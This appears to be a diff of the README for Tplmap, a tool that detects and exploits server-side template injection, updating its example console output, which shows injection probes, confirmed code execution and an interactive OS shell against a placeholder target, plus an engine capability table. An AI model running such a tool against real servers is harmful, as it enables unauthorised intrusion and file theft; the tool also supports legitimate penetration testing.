@@ -9,6 +9,8 @@ The technique can be used to compromise web servers' internals and often obtain 
 
 The modular approach allows any contributor to extend the support to other templating engines or introduce new exploitation techniques. The majority of the techniques currently implemented came from the amazing research done by [James Kett, PortSwigger][1].
 
+Tplmap is able to detect and exploit rendered and blind SSTI and exploit injections in text and code contexts.
+
 > The application is currently under heavy development and misses some functionalities.
 
 Example
@@ -16,30 +18,25 @@ Example
 
 ```
 $ ./tplmap.py -u 'http://www.target.com/app?id=*' 
-[[+] Tplmap 0.1b
+[+] Tplmap 0.1c
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
-[+] Found placeholder in GET parameter 'id'
-[+] Smarty plugin is testing reflection on text context with tag {*}
-[+] Smarty plugin is testing }*{ code context escape with 6 mutations
-[+] Mako plugin is testing reflection on text context with tag ${*}
-[+] Mako plugin is testing %>*<%# code context escape with 6 mutations
-[+] Jinja2 plugin is testing reflection on text context with tag {{*}}
-[+] Jinja2 plugin is testing %}* code context escape with 6 mutations
-[+] Twig plugin is testing reflection on text context with tag {{*}}
-[+] Twig plugin is testing }}*{{1 code context escape with 6 mutations
-[+] Freemarker plugin is testing reflection on text context with tag ${*}
-[+] Freemarker plugin is testing }* code context escape with 6 mutations
-[+] Velocity plugin is testing reflection on text context with tag #set($p=*)\n${p}\n
-[+] Velocity plugin is testing )* code context escape with 6 mutations
-[+] Jade plugin is testing reflection on text context with tag \n= *\n
+[+] Found placeholder in GET parameter 'inj'
+[+] Smarty plugin is testing rendering with tag '{*}'
+[+] Smarty plugin is testing blind injection
+[+] Mako plugin is testing rendering with tag '${*}'
+...
+[+] Freemarker plugin is testing blind injection
+[+] Velocity plugin is testing rendering with tag '#set($c=*)\n${c}\n'
+[+] Jade plugin is testing rendering with tag '\n= *\n'
 [+] Jade plugin has confirmed injection with tag '\n= *\n'
 [+] Tplmap identified the following injection point:
 
   Engine: Jade
-  Template: \n= *\n
+  Injection: \n= *\n
   Context: text
   OS: darwin
+  Technique: render
   Capabilities:
     Code evaluation: yes, javascript code
     OS command execution: yes
@@ -50,7 +47,7 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=*'
     --os-cmd or --os-shell to access the underlying operating system
     --upload LOCAL REMOTE to upload files to the server
     --download REMOTE LOCAL to download remote files
-    
+        
 $ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
 [+] Run commands on the operating system.
 linux $ whoami
@@ -64,16 +61,16 @@ linux $
 Supported template engines
 --------------------------
 
-| Template engine    | Detection | command execution | Code evaluation | File read | File write |
-|--------------------|-----------|-------------------|-----------------|-----------|------------|
-| Mako               |  yes      | yes               | python          | yes       | yes        |
-| Jinja2             |  yes      | yes               | python          | yes       | yes        |
-| Jade               |  yes      | yes               | javascript      | yes       | yes        |
-| Smarty (unsecured) |  yes      | yes               | PHP             | yes       | yes        |
-| Freemarker         |  yes      | yes               | no              | yes       | yes        |
-| Velocity           |  yes      | no                | no              | no        | no         |
-| Twig               |  yes      | no                | no              | no        | no         |
-| Smarty (secured)   |  yes      | no                | no              | no        | no         |
+| Template engine    | Detection          | Command execution | Code evaluation | File read | File write |
+|--------------------|--------------------|-------------------|-----------------|-----------|------------|
+| Mako               |  render+blind      | yes               | python          | yes       | yes        |
+| Jinja2             |  render+blind      | yes               | python          | yes       | yes        |
+| Jade               |  render+blind      | yes               | javascript      | yes       | yes        |
+| Smarty (unsecured) |  render+blind      | yes               | PHP             | yes       | yes        |
+| Freemarker         |  render+blind      | yes               | no              | yes       | yes        |
+| Velocity           |  render            | no                | no              | no        | no         |
+| Twig               |  render            | no                | no              | no        | no         |
+| Smarty (secured)   |  render            | no                | no              | no        | no         |
 
 
 [1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
